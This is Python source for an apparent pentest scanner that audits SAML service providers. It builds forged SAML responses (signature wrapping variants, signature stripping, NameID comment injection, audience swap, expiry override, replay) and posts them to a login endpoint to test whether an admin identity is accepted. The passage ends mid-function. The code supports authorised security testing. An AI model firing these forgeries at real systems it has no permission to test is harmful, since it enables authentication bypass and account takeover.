"""saml_signature_audit - SAML XML Signature attack audit (VL-METHOD).

Phase D web-credential-access differentiator. Built 2026-06-05 on the
VL-METHOD 7-step pentest pattern (modeled on hydra_ssh_spray.py and
kerberoast_audit.py).

What this scanner does, in one paragraph
----------------------------------------
SAML SSO bind-checks are notoriously gappy: many SPs (Service Providers)
validate the XML signature in a way that is decoupled from the assertion
the application logic actually trusts. The classic exploit family is XML
Signature Wrapping (XSW1-XSW8), where the attacker keeps the signed
element verbatim (so the signature still validates) but injects a SECOND,
unsigned, copy that the SAML processor extracts the NameID from. Other
variants in the family include outright signature stripping (some
implementations only enforce signatures conditionally), comment injection
inside NameID (some XML parsers drop comments AFTER the digest is
computed, returning a different string to the app), and replay/audience
issues. This scanner exercises 5 XSW variants in quick_probe, then 3
extended variants + replay + audience + expiry checks in deep_scan,
posting each crafted SAML response to the customer-supplied ACS endpoint
and looking at the response for an authenticated-session marker.

7 stages this scanner performs
------------------------------

  1. PRE-FLIGHT  - Require target + acs_url + saml_response (base64).
                    Validate the supplied SAML response is decodable
                    base64 that parses as XML. HTTP-probe target to
                    verify reachable. Skip otherwise.

  2. FINGERPRINT - Inspect the customer-supplied SAML XML:
                    SAML version, Issuer, signature algorithm
                    (SHA1/SHA256/SHA512), canonicalization method,
                    presence of X509Certificate, Conditions/
                    NotOnOrAfter, AudienceRestriction, whether
                    signature references the Assertion vs Response.

  3. QUICK PROBE - 5 XSW variants tested serially against acs_url:
                    XSW1 clone-sibling, XSW3 wrap-in-Extensions,
                    signature stripping, comment injection in NameID,
                    replay (same response sent twice).

  4. DEEP SCAN   - Gated on quick_probe hits OR options.always_deep.
                    XSW4-XSW8 namespace/multi-assertion variants +
                    3x replay-window test + audience swap +
                    Conditions/NotOnOrAfter expiry override.

  5. VERIFY      - For each accepted forge, re-send with a different
                    NameID. If the SP accepts a DIFFERENT identity
                    -> CONFIRMED (verification_method=
                    saml_xsw_retest_with_different_identity). Else
                    SUSPECTED.

  6. PRIVILEGE   - admin* NameID accepted -> admin_impersonation,
                    user* NameID accepted -> user_impersonation,
                    Audience swap accepted (no NameID change) ->
                    audience_confusion.

  7. CHAIN       - CONFIRMED admin_impersonation -> post_exploit_
                    saml_session_takeover.  Any CONFIRMED signature
                    bypass -> session_predict_audit (the resulting
                    session cookie may itself be guessable).

Customer input via ScanRequest.options
--------------------------------------
  target           - SAML SP base URL (REQUIRED - taken from req.target)
  options.acs_url  - Assertion Consumer Service endpoint
                     (REQUIRED - the URL that processes SAML responses)
  options.saml_response - base64-encoded valid SAML response captured
                     from a real successful login via browser DevTools
                     (REQUIRED - customer-supplied baseline)
  options.always_deep - bool, run extended XSW4-XSW8 + replay/audience
                     tests even if quick_probe yielded 0 acceptances
                     (default: False)
  options.show_plaintext - bool, return raw XML excerpts in evidence
                     instead of length-shape markers (customer scanning
                     own infra) (default: False)
  options.timeout_sec - per-POST wall-clock timeout (default 10, hard
                     capped at 10s anyway to avoid burning the budget)

Safety guard: every ACS POST is hard-timeout 10s, we work on copies of
the customer-supplied saml_response so the original is never mutated
in-place, and XSW variants preserve the signed element verbatim so the
SP signature-validator still passes (this is the whole point - if the
SP rejects the signature, we don't have a finding; if it accepts the
wrapped-modified copy as authenticated, we have CRITICAL/HIGH).
"""
from __future__ import annotations

import asyncio
import base64
import copy
import hashlib
import re
import time
from typing import Optional

from fastapi import APIRouter, Depends
from pydantic import BaseModel  # noqa: F401 (kept for ScanRequest extension)

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext
from tools._methodology import MethodologyScanner, helpers
from tools._payloads.saml_signature_audit_findings import (
    SAML_SIGNATURE_AUDIT_FINDING_RULES,
    INTEL_FIELDS,
)

router = APIRouter()

# Hard caps - per-POST + total ceiling
ACS_POST_TIMEOUT = 10.0
HARD_MAX_DEEP_TESTS = 12
HARD_MAX_REPLAY = 3

# SAML namespace URIs we care about
NS_SAML2 = "urn:oasis:names:tc:SAML:2.0:assertion"
NS_SAMLP2 = "urn:oasis:names:tc:SAML:2.0:protocol"
NS_DS = "http://www.w3.org/2000/09/xmldsig#"

# XPath-ish substrings that indicate an authenticated landing page
AUTH_MARKERS = (
    "welcome", "dashboard", "logout", "sign out", "my account",
    "profile", "home", "account-menu", "loggedin", "logged-in",
)


class SamlSignatureAuditRequest(ScanRequest):
    options: Optional[dict] = None


# ════════════════════════════════════════════════════════════════════
#  Redaction helper
# ════════════════════════════════════════════════════════════════════


def _redact(xml_or_token: str, show_plaintext: bool = False) -> str:
    """Customer-safe redaction for XML excerpts / SAML tokens.

    Default behavior returns a stable shape marker like
        "len=4218_sha8=9a3f8e1c"
    where the 8-char hash is sha256 of the input. Same input -> same
    marker for audit correlation, but no XML payload leaks.

    show_plaintext=True returns the raw string up to 480 chars (truncated
    so multi-tenant logs don't get huge SAML blobs)."""
    if not xml_or_token:
        return "len=0"
    s = xml_or_token if isinstance(xml_or_token, str) else str(xml_or_token)
    if show_plaintext:
        return s[:480] + ("..." if len(s) > 480 else "")
    digest = hashlib.sha256(s.encode("utf-8", errors="ignore")).hexdigest()[:8]
    return f"len={len(s)}_sha8={digest}"


# ════════════════════════════════════════════════════════════════════
#  XML helpers (lxml-required; tolerant of ImportError)
# ════════════════════════════════════════════════════════════════════


def _lxml():
    """Lazy lxml import returning (etree, ok). Caller branches on ok."""
    try:
        from lxml import etree  # type: ignore
        return (etree, True)
    except ImportError:
        return (None, False)


def _decode_saml(b64_str: str):
    """Decode + parse base64 SAML response. Return (root, raw_xml_bytes,
    error_str)."""
    if not b64_str:
        return (None, b"", "empty input")
    etree, ok = _lxml()
    if not ok:
        return (None, b"", "lxml_missing")
    try:
        # SAML responses may carry whitespace/newlines; tolerate them
        cleaned = re.sub(r"\s+", "", b64_str.strip())
        raw = base64.b64decode(cleaned, validate=False)
    except Exception as e:
        return (None, b"", f"base64_decode: {type(e).__name__}: {str(e)[:120]}")
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True,
                                  huge_tree=False, recover=False)
        root = etree.fromstring(raw, parser=parser)
        return (root, raw, "")
    except Exception as e:
        return (None, raw, f"xml_parse: {type(e).__name__}: {str(e)[:120]}")


def _encode_saml(root) -> str:
    """Serialize an lxml Element back to base64 SAMLResponse form."""
    etree, ok = _lxml()
    if not ok:
        return ""
    try:
        xml_bytes = etree.tostring(root, xml_declaration=False, encoding="utf-8")
        return base64.b64encode(xml_bytes).decode("ascii")
    except Exception:
        return ""


def _find_first(root, localname: str, ns: str = NS_SAML2):
    """Find first descendant by namespaced localname (XPath-light)."""
    etree, ok = _lxml()
    if not ok or root is None:
        return None
    tag = f"{{{ns}}}{localname}"
    if root.tag == tag:
        return root
    for el in root.iter(tag):
        return el
    return None


def _find_all(root, localname: str, ns: str = NS_SAML2) -> list:
    etree, ok = _lxml()
    if not ok or root is None:
        return []
    tag = f"{{{ns}}}{localname}"
    return list(root.iter(tag))


def _signature_alg_from_xml(root) -> str:
    """Read the SignatureMethod Algorithm URI from the first ds:Signature.
    Returns short tag: 'sha1' | 'sha256' | 'sha512' | 'unknown' | ''."""
    etree, ok = _lxml()
    if not ok or root is None:
        return ""
    sig = _find_first(root, "Signature", ns=NS_DS)
    if sig is None:
        return ""
    sm = None
    for el in sig.iter(f"{{{NS_DS}}}SignatureMethod"):
        sm = el
        break
    if sm is None:
        return "unknown"
    alg = (sm.get("Algorithm") or "").lower()
    if "sha1" in alg or "rsa-sha1" in alg or "#sha1" in alg:
        return "sha1"
    if "sha256" in alg:
        return "sha256"
    if "sha512" in alg:
        return "sha512"
    return "unknown"


def _c14n_method(root) -> str:
    sig = _find_first(root, "Signature", ns=NS_DS)
    if sig is None:
        return ""
    for el in sig.iter(f"{{{NS_DS}}}CanonicalizationMethod"):
        return (el.get("Algorithm") or "")[:120]
    return ""


def _signature_covers(root) -> tuple[bool, bool]:
    """Return (has_assertion_signature, has_response_signature)."""
    if root is None:
        return (False, False)
    assertion_sig = False
    response_sig = False
    # Response-level: Signature is direct child of samlp:Response
    if root.tag.endswith("Response"):
        for child in root:
            if child.tag == f"{{{NS_DS}}}Signature":
                response_sig = True
                break
    # Assertion-level: Signature is direct child of saml:Assertion
    for assertion in _find_all(root, "Assertion", ns=NS_SAML2):
        for child in assertion:
            if child.tag == f"{{{NS_DS}}}Signature":
                assertion_sig = True
                break
        if assertion_sig:
            break
    return (assertion_sig, response_sig)


def _set_name_id(root, new_value: str) -> bool:
    """Set the first NameID's text. Returns True if a NameID was found."""
    nid = _find_first(root, "NameID", ns=NS_SAML2)
    if nid is None:
        return False
    nid.text = new_value
    return True


def _read_audience(root) -> str:
    aud = _find_first(root, "Audience", ns=NS_SAML2)
    return (aud.text or "") if aud is not None else ""


def _read_issuer(root) -> str:
    iss = _find_first(root, "Issuer", ns=NS_SAML2)
    return (iss.text or "") if iss is not None else ""


def _read_not_on_or_after(root) -> str:
    cond = _find_first(root, "Conditions", ns=NS_SAML2)
    if cond is not None:
        v = cond.get("NotOnOrAfter")
        if v:
            return v
    sub = _find_first(root, "SubjectConfirmationData", ns=NS_SAML2)
    if sub is not None:
        v = sub.get("NotOnOrAfter")
        if v:
            return v
    return ""


def _has_x509(root) -> bool:
    if root is None:
        return False
    for _ in root.iter(f"{{{NS_DS}}}X509Certificate"):
        return True
    return False


def _saml_version(root) -> str:
    if root is None:
        return ""
    v = root.get("Version") or ""
    if v:
        return v
    assertion = _find_first(root, "Assertion", ns=NS_SAML2)
    if assertion is not None:
        return assertion.get("Version") or ""
    return ""


# ════════════════════════════════════════════════════════════════════
#  XSW forge constructors (each returns base64 string or "")
# ════════════════════════════════════════════════════════════════════


def _xsw1_clone_sibling(orig_root, forged_nameid: str) -> str:
    """XSW1: keep the SIGNED Assertion verbatim, and insert a CLONE
    (with modified NameID) as a sibling. Some processors take the FIRST
    Assertion they find for identity but validate the LAST Signature."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        original_assertion = _find_first(root, "Assertion", ns=NS_SAML2)
        if original_assertion is None:
            return ""
        # Build the cloned modified assertion
        cloned = copy.deepcopy(original_assertion)
        # Remove the inner Signature from the clone so it's clearly the
        # "evil" copy with no signature of its own
        for sig in list(cloned.iter(f"{{{NS_DS}}}Signature")):
            parent = sig.getparent()
            if parent is not None:
                parent.remove(sig)
        # Mutate the cloned NameID to the forged identity
        cloned_nid = _find_first(cloned, "NameID", ns=NS_SAML2)
        if cloned_nid is not None:
            cloned_nid.text = forged_nameid
        # Insert clone BEFORE the original in the Response so the SAML
        # processor sees the clone first (some implementations grab
        # the first matching element)
        parent = original_assertion.getparent()
        if parent is None:
            return ""
        parent.insert(list(parent).index(original_assertion), cloned)
        return _encode_saml(root)
    except Exception:
        return ""


def _xsw3_wrap_in_extensions(orig_root, forged_nameid: str) -> str:
    """XSW3: wrap a MODIFIED Assertion inside an samlp:Extensions
    element on the Response, keeping the original SIGNED Assertion
    intact. Processors that walk the tree for /Response/Assertion will
    find the original; ones that find the first Assertion by namespaced
    name regardless of position grab the modified one."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        original_assertion = _find_first(root, "Assertion", ns=NS_SAML2)
        if original_assertion is None:
            return ""
        forged_assertion = copy.deepcopy(original_assertion)
        # Drop inner signature in the forged copy
        for sig in list(forged_assertion.iter(f"{{{NS_DS}}}Signature")):
            parent = sig.getparent()
            if parent is not None:
                parent.remove(sig)
        # Mutate forged NameID
        f_nid = _find_first(forged_assertion, "NameID", ns=NS_SAML2)
        if f_nid is not None:
            f_nid.text = forged_nameid
        # Create an Extensions wrapper and put the forged assertion inside
        extensions = etree.SubElement(root, f"{{{NS_SAMLP2}}}Extensions")
        extensions.append(forged_assertion)
        # Move Extensions BEFORE the original assertion in document order
        parent = original_assertion.getparent()
        if parent is None:
            return ""
        parent.remove(extensions)
        parent.insert(list(parent).index(original_assertion), extensions)
        return _encode_saml(root)
    except Exception:
        return ""


def _strip_signature(orig_root) -> str:
    """Signature stripping: remove every ds:Signature element entirely.
    Probes whether the SP enforces signature presence at all."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        for sig in list(root.iter(f"{{{NS_DS}}}Signature")):
            parent = sig.getparent()
            if parent is not None:
                parent.remove(sig)
        return _encode_saml(root)
    except Exception:
        return ""


def _comment_injection_nameid(orig_root, real_user: str,
                                forged_user: str) -> str:
    """Comment injection in NameID. Modify
        <NameID>user@victim.com</NameID>
    to
        <NameID>admin@victim.com<!--user@victim.com--></NameID>
    Some XML parsers normalize the text-content to "admin@victim.com"
    (comments dropped) AFTER digest computation, so the signature still
    matches the canonical bytes 'admin@victim.com<!--user@victim.com-->'
    but the application logic sees 'admin@victim.com'."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        nid = _find_first(root, "NameID", ns=NS_SAML2)
        if nid is None:
            return ""
        # Build: text=forged_user, then a Comment child with real_user
        nid.text = forged_user
        comment = etree.Comment(real_user)
        nid.append(comment)
        return _encode_saml(root)
    except Exception:
        return ""


def _xsw4_clone_after(orig_root, forged_nameid: str) -> str:
    """XSW4: clone Assertion inserted AFTER the signed copy (variant
    of XSW1 with the position flipped)."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        original_assertion = _find_first(root, "Assertion", ns=NS_SAML2)
        if original_assertion is None:
            return ""
        cloned = copy.deepcopy(original_assertion)
        for sig in list(cloned.iter(f"{{{NS_DS}}}Signature")):
            parent = sig.getparent()
            if parent is not None:
                parent.remove(sig)
        c_nid = _find_first(cloned, "NameID", ns=NS_SAML2)
        if c_nid is not None:
            c_nid.text = forged_nameid
        parent = original_assertion.getparent()
        if parent is None:
            return ""
        parent.insert(list(parent).index(original_assertion) + 1, cloned)
        return _encode_saml(root)
    except Exception:
        return ""


def _xsw7_wrap_in_object(orig_root, forged_nameid: str) -> str:
    """XSW7-ish: wrap the original SIGNED Assertion inside a ds:Object
    container, putting the forged Assertion as a sibling at the
    Response root. Processors that look up the signed ID by Reference
    still see the original; tree-walkers see the forged."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        original_assertion = _find_first(root, "Assertion", ns=NS_SAML2)
        if original_assertion is None:
            return ""
        parent = original_assertion.getparent()
        if parent is None:
            return ""
        # Build ds:Object wrapper, move the original assertion inside it
        ds_object = etree.Element(f"{{{NS_DS}}}Object")
        idx = list(parent).index(original_assertion)
        parent.remove(original_assertion)
        ds_object.append(original_assertion)
        parent.insert(idx, ds_object)
        # Now inject a forged sibling at the original position
        forged = copy.deepcopy(original_assertion)
        for sig in list(forged.iter(f"{{{NS_DS}}}Signature")):
            sig_parent = sig.getparent()
            if sig_parent is not None:
                sig_parent.remove(sig)
        f_nid = _find_first(forged, "NameID", ns=NS_SAML2)
        if f_nid is not None:
            f_nid.text = forged_nameid
        parent.insert(idx + 1, forged)
        return _encode_saml(root)
    except Exception:
        return ""


def _xsw8_multi_assertion(orig_root, forged_nameid: str) -> str:
    """XSW8: two-assertion attack. Original signed Assertion stays;
    a forged unsigned Assertion is appended at end. Some processors
    iterate ALL Assertions and let the LAST one win for identity."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        original_assertion = _find_first(root, "Assertion", ns=NS_SAML2)
        if original_assertion is None:
            return ""
        forged = copy.deepcopy(original_assertion)
        for sig in list(forged.iter(f"{{{NS_DS}}}Signature")):
            sig_parent = sig.getparent()
            if sig_parent is not None:
                sig_parent.remove(sig)
        f_nid = _find_first(forged, "NameID", ns=NS_SAML2)
        if f_nid is not None:
            f_nid.text = forged_nameid
        # Append at end of Response
        parent = original_assertion.getparent()
        if parent is None:
            return ""
        parent.append(forged)
        return _encode_saml(root)
    except Exception:
        return ""


def _swap_audience(orig_root, new_audience: str) -> str:
    """Replace AudienceRestriction/Audience with attacker.com to test
    whether the SP enforces the audience match."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        aud = _find_first(root, "Audience", ns=NS_SAML2)
        if aud is None:
            return ""
        aud.text = new_audience
        return _encode_saml(root)
    except Exception:
        return ""


def _override_notonorafter(orig_root, new_value: str) -> str:
    """Force NotOnOrAfter to a past timestamp to test expiry enforcement."""
    etree, ok = _lxml()
    if not ok or orig_root is None:
        return ""
    try:
        root = copy.deepcopy(orig_root)
        cond = _find_first(root, "Conditions", ns=NS_SAML2)
        if cond is None:
            return ""
        cond.set("NotOnOrAfter", new_value)
        # Also stamp the SubjectConfirmationData if present
        sub = _find_first(root, "SubjectConfirmationData", ns=NS_SAML2)
        if sub is not None:
            sub.set("NotOnOrAfter", new_value)
        return _encode_saml(root)
    except Exception:
        return ""


# ════════════════════════════════════════════════════════════════════
#  HTTP - POST a forged SAMLResponse to the ACS and read accepted-ness
# ════════════════════════════════════════════════════════════════════


async def _post_saml_response(acs_url: str, saml_b64: str,
                               relay_state: str = "") -> dict:
    """Submit form-encoded SAMLResponse to acs_url. Returns a dict
    summarizing whether the SP appears to have ACCEPTED the response.

    Acceptance signals (in order):
      - HTTP 302 to a URL that doesn't contain 'error'/'login'/'fail'
      - Set-Cookie with a session-like name (JSESSIONID, sessionid,
        connect.sid, auth_token, etc.)
      - Body contains one of AUTH_MARKERS and does NOT contain "error"
    """
    out = {
        "status": 0,
        "accepted": False,
        "signal": "",
        "redirect_to": "",
        "set_cookie_keys": "",
        "body_excerpt": "",
        "error": "",
    }
    try:
        import httpx  # type: ignore
    except ImportError:
        out["error"] = "httpx_missing"
        return out
    if not acs_url or not saml_b64:
        out["error"] = "missing acs_url or payload"
        return out

    data = {"SAMLResponse": saml_b64}
    if relay_state:
        data["RelayState"] = relay_state

    try:
        async with httpx.AsyncClient(verify=False, follow_redirects=False,
                                      timeout=ACS_POST_TIMEOUT) as client:
            resp = await client.post(acs_url, data=data,
                                      headers={"User-Agent": "VL-SAML-Audit/1"})
            out["status"] = int(resp.status_code)
            body = ""
            try:
                body = (resp.text or "")[:600]
            except Exception:
                body = ""
            out["body_excerpt"] = body
            # Capture set-cookie keys (not values)
            try:
                cookies = []
                for k in resp.cookies.keys():
                    cookies.append(k)
                out["set_cookie_keys"] = ",".join(cookies[:8])
            except Exception:
                pass
            # 302 to non-error landing
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("location") or ""
                out["redirect_to"] = loc[:240]
                low = loc.lower()
                if loc and not any(bad in low for bad in
                                    ("error", "login", "fail", "denied",
                                     "signin", "sso")):
                    out["accepted"] = True
                    out["signal"] = "302_to_authenticated_landing"
                    return out
                # Session-cookie set on 302 is also a strong acceptance
                if any(k.lower() in ("jsessionid", "sessionid", "connect.sid",
                                       "auth_token", "session", "sid")
                       for k in (out["set_cookie_keys"].split(",") or [])):
                    out["accepted"] = True
                    out["signal"] = "302_with_session_cookie"
                    return out
            # 200 with body marker + no "error"
            if resp.status_code == 200:
                low = body.lower()
                has_marker = any(m in low for m in AUTH_MARKERS)
                has_error = ("error" in low or "invalid" in low or
                             "denied" in low or "not authorized" in low)
                if has_marker and not has_error:
                    out["accepted"] = True
                    out["signal"] = "200_with_auth_marker_no_error"
                    return out
        return out
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {str(e)[:160]}"
        return out


# ════════════════════════════════════════════════════════════════════
#  Identity classifier (drives privilege_check)
# ════════════════════════════════════════════════════════════════════


def _classify_identity(name_id: str) -> str:
    """Map a forged NameID to a privilege class."""
    if not name_id:
        return "unknown_identity"
    low = name_id.lower()
    if any(t in low for t in ("admin", "root", "superuser", "administrator")):
        return "admin_impersonation"
    return "user_impersonation"


# ════════════════════════════════════════════════════════════════════
#  SamlSignatureAudit - the VL-METHOD scanner class
# ════════════════════════════════════════════════════════════════════


class SamlSignatureAudit(MethodologyScanner):
    name = "saml_signature_audit"

    # ── STAGE 1: PRE-FLIGHT ──────────────────────────────────────
    async def pre_flight(self, ctx: ScanContext) -> bool:
        opts = ctx.state.get("_options") or {}
        target = (ctx.host or "").strip()
        acs_url = (opts.get("acs_url") or "").strip()
        saml_b64 = (opts.get("saml_response") or "").strip()

        # Check lxml first so the finding rule can surface a clean INFO
        _etree, lxml_ok = _lxml()
        if not lxml_ok:
            ctx.state["lxml_missing"] = True
            ctx.state["skipped_reason"] = (
                "lxml Python library not installed - cannot manipulate "
                "SAML XML for signature attack tests")
            return False

        if not target or not acs_url or not saml_b64:
            ctx.state["skipped_reason"] = (
                "saml_signature_audit requires target + acs_url + valid "
                "saml_response (base64) - one or more inputs missing")
            return False

        # Validate the SAML response: must base64-decode AND parse XML
        root, raw, err = _decode_saml(saml_b64)
        if root is None:
            ctx.state["skipped_reason"] = (
                "saml_response not valid base64 XML - decode/parse error: "
                f"{err or 'unknown'}")
            return False

        # HTTP probe target to verify reachable
        reachable = False
        try:
            import httpx  # type: ignore
            try:
                probe_url = target if target.startswith(("http://", "https://")) \
                    else f"https://{target}"
                async with httpx.AsyncClient(verify=False,
                                              follow_redirects=False,
                                              timeout=6.0) as client:
                    resp = await client.get(probe_url,
                                             headers={"User-Agent":
                                                      "VL-SAML-Audit/1"})
                    if resp.status_code < 600:
                        reachable = True
            except Exception:
                reachable = False
        except ImportError:
            ctx.state["httpx_missing"] = True
            ctx.state["skipped_reason"] = (
                "httpx Python library not installed - cannot POST forged "
                "SAML responses to the ACS endpoint")
            return False

        ctx.state["target_reachable"] = reachable
        if not reachable:
            ctx.state["skipped_reason"] = (
                f"SAML SP target {target} not reachable over HTTP(S) - "
                "cannot test signature attack acceptance")
            return False

        ctx.state["target_base"] = target
        ctx.state["acs_url"] = acs_url
        ctx.state["saml_xml"] = root
        ctx.state["saml_raw_b64"] = saml_b64
        return True

    # ── STAGE 2: FINGERPRINT ─────────────────────────────────────
    async def fingerprint(self, ctx: ScanContext):
        root = ctx.state.get("saml_xml")
        if root is None:
            ctx.state["fingerprint"] = {"error": "no parsed SAML"}
            return
        has_assertion_sig, has_response_sig = _signature_covers(root)
        fp = {
            "saml_version": _saml_version(root),
            "issuer": _read_issuer(root)[:240],
            "sig_alg": _signature_alg_from_xml(root),
            "c14n_method": _c14n_method(root),
            "x509_present": _has_x509(root),
            "audience": _read_audience(root)[:240],
            "not_on_or_after": _read_not_on_or_after(root)[:64],
            "has_assertion_signature": has_assertion_sig,
            "has_response_signature": has_response_sig,
        }
        ctx.state["fingerprint"] = fp

    # ── STAGE 3: QUICK PROBE (5 XSW variants) ────────────────────
    async def quick_probe(self, ctx: ScanContext) -> list[dict]:
        root = ctx.state.get("saml_xml")
        acs_url = ctx.state.get("acs_url") or ""
        opts = ctx.state.get("_options") or {}
        show = bool(opts.get("show_plaintext"))
        if root is None or not acs_url:
            ctx.state["quick_probe_attempts"] = 0
            ctx.state["quick_probe_hits"] = 0
            return []

        # Derive a real user value from the legitimate SAML for comment-
        # injection so the signed digest matches the wrapped form
        nid = _find_first(root, "NameID", ns=NS_SAML2)
        real_user = (nid.text or "user@victim.com") if nid is not None \
            else "user@victim.com"

        # Variant catalog: (variant_id, kind, builder_callable, forged_nameid)
        variants = [
            ("xsw1", "xsw_clone_sibling",
                _xsw1_clone_sibling(root, "admin@target.com"),
                "admin@target.com"),
            ("xsw3", "xsw_wrap_extensions",
                _xsw3_wrap_in_extensions(root, "admin@target.com"),
                "admin@target.com"),
            ("strip", "signature_stripping",
                _strip_signature(root),
                ""),
            ("comment", "comment_injection_nameid",
                _comment_injection_nameid(root, real_user, "admin@target.com"),
                "admin@target.com"),
            ("replay1", "replay_attack_first_send",
                ctx.state.get("saml_raw_b64") or "",
                ""),
        ]

        findings: list[dict] = []
        accepted_count = 0
        attempts = 0

        for variant_id, kind, payload, forged_nameid in variants:
            attempts += 1
            if not payload:
                continue
            result = await _post_saml_response(acs_url, payload)
            accepted = bool(result.get("accepted"))
            if accepted:
                accepted_count += 1
            findings.append({
                "id": f"qp_{variant_id}",
                "kind": kind,
                "variant": variant_id,
                "forged_nameid": forged_nameid,
                "accepted": accepted,
                "http_status": result.get("status", 0),
                "signal": result.get("signal", ""),
                "redirect_to": result.get("redirect_to", "")[:240],
                "set_cookie_keys": result.get("set_cookie_keys", ""),
                "body_excerpt_marker": _redact(result.get("body_excerpt", ""),
                                                show_plaintext=show),
                "payload_marker": _redact(payload, show_plaintext=False),
                "post_error": result.get("error", ""),
                "discovery_method": "quick_probe_xsw_serial",
                "_payload_private": payload,  # used by verify stage
            })

        # Replay test #1 sent at qp stage already - second/third sends
        # happen in deep_scan if always_deep set (since 1 send alone
        # doesn't tell us about replay protection)
        ctx.state["quick_probe_attempts"] = attempts
        ctx.state["quick_probe_hits"] = accepted_count
        return findings

    # ── STAGE 4: DEEP SCAN (extended XSW + replay + audience + expiry)
    async def deep_scan(self, ctx: ScanContext) -> list[dict]:
        root = ctx.state.get("saml_xml")
        acs_url = ctx.state.get("acs_url") or ""
        opts = ctx.state.get("_options") or {}
        show = bool(opts.get("show_plaintext"))
        if root is None or not acs_url:
            return []

        findings: list[dict] = []
        tests_run = 0

        # XSW4 - clone after the signed assertion
        if tests_run < HARD_MAX_DEEP_TESTS:
            payload = _xsw4_clone_after(root, "admin@target.com")
            if payload:
                tests_run += 1
                r = await _post_saml_response(acs_url, payload)
                findings.append(self._make_finding(
                    "deep_xsw4", "xsw_clone_after",
                    "xsw4", "admin@target.com",
                    payload, r, show))

        # XSW7 - wrap-in-Object
        if tests_run < HARD_MAX_DEEP_TESTS:
            payload = _xsw7_wrap_in_object(root, "admin@target.com")
            if payload:
                tests_run += 1
                r = await _post_saml_response(acs_url, payload)
                findings.append(self._make_finding(
                    "deep_xsw7", "xsw_wrap_object",
                    "xsw7", "admin@target.com",
                    payload, r, show))

        # XSW8 - multi-assertion (last one wins)
        if tests_run < HARD_MAX_DEEP_TESTS:
            payload = _xsw8_multi_assertion(root, "admin@target.com")
            if payload:
                tests_run += 1
                r = await _post_saml_response(acs_url, payload)
                findings.append(self._make_finding(
                    "deep_xsw8", "xsw_multi_assertion",
                    "xsw8", "admin@target.com",
                    payload, r, show))

        # Replay attack: send the SAME valid response 3 times within ~30s
        replay_b64 = ctx.state.get("saml_raw_b64") or ""
        if replay_b64 and tests_run < HARD_MAX_DEEP_TESTS:
            replay_results = []
            for i in range(HARD_MAX_REPLAY):
                if tests_run >= HARD_MAX_DEEP_TESTS:
                    break
                tests_run += 1
                r = await _post_saml_response(acs_url, replay_b64)
                replay_results.append(r)
                # tiny pause so replay-tracking server can record the prior
                await asyncio.sleep(0.5)
            all_accepted = all(rr.get("accepted") for rr in replay_results)
            findings.append({
                "id": "deep_replay",
                "kind": "replay_attack_3x",
                "variant": "replay_window",
                "forged_nameid": "",  # replay = original NameID
                "accepted": all_accepted,
                "http_status": (replay_results[-1].get("status", 0)
                                if replay_results else 0),
                "signal": ("all_3_accepted_no_replay_protection"
                           if all_accepted else "at_least_one_rejected"),
                "redirect_to": "",
                "set_cookie_keys": "",
                "body_excerpt_marker": _redact(
                    (replay_results[-1].get("body_excerpt", "")
                     if replay_results else ""), show_plaintext=show),
                "payload_marker": _redact(replay_b64,
                                            show_plaintext=False),
                "post_error": "",
                "discovery_method": "deep_scan_replay_window",
                "replay_count": len(replay_results),
                "_payload_private": replay_b64,
            })

        # Audience swap
        if tests_run < HARD_MAX_DEEP_TESTS:
            payload = _swap_audience(root, "https://attacker.com/audience")
            if payload:
                tests_run += 1
                r = await _post_saml_response(acs_url, payload)
                findings.append({
                    "id": "deep_audience",
                    "kind": "audience_mismatch",
                    "variant": "audience_swap",
                    "forged_nameid": "",  # audience-only, not NameID
                    "accepted": bool(r.get("accepted")),
                    "http_status": r.get("status", 0),
                    "signal": r.get("signal", ""),
                    "redirect_to": r.get("redirect_to", "")[:240],
                    "set_cookie_keys": r.get("set_cookie_keys", ""),
                    "body_excerpt_marker": _redact(r.get("body_excerpt", ""),
                                                    show_plaintext=show),
                    "payload_marker": _redact(payload,
                                                show_plaintext=False),
                    "post_error": r.get("error", ""),
                    "discovery_method": "deep_scan_audience_swap",
                    "_payload_private": payload,
                })

        # Conditions/NotOnOrAfter expiry override
        if tests_run < HARD_MAX_DEEP_TESTS:
            payload = _override_notonorafter(root, "2000-01-01T00:00:00Z")
            if payload:
                tests_run += 1
                r = await _post_saml_response(acs_url, payload)
                findings.append({
                    "id": "deep_expired",
                    "kind": "expired_assertion",
                    "variant": "notonorafter_past",
                    "forged_nameid": "",
                    "accepted": bool(r.get("accepted")),
                    "http_status": r.get("status", 0),
                    "signal": r.get("signal", ""),
                    "redirect_to": r.get("redirect_to", "")[:240],
                    "set_cookie_keys": r.get("set_cookie_keys", ""),
                    "body_excerpt_marker": _redact(r.get("body_excerpt", ""),
                                                    show_plaintext=show),
                    "payload_marker": _redact(payload,
                                                show_plaintext=False),
                    "post_error": r.get("error", ""),
                    "discovery_method": "deep_scan_expiry_override",
                    "_payload_private": payload,
                })

        ctx.state["deep_tests_run"] = tests_run
        return findings

    @staticmethod
    def _make_finding(fid: str, kind: str, variant: str,
                       forged_nameid: str, payload: str,
                       result: dict, show_plaintext: bool) -> dict:
        return {
            "id": fid,
            "kind": kind,
            "variant": variant,
            "forged_nameid": forged_nameid,
            "accepted": bool(result.get("accepted")),
            "http_status": result.get("status", 0),
            "signal": result.get("signal", ""),
            "redirect_to": result.get("redirect_to", "")[:240],
            "set_cookie_keys": result.get("set_cookie_keys", ""),
            "body_excerpt_marker": _redact(result.get("body_excerpt", ""),
                                            show_plaintext=show_plaintext),
            "payload_marker": _redact(payload, show_plaintext=False),
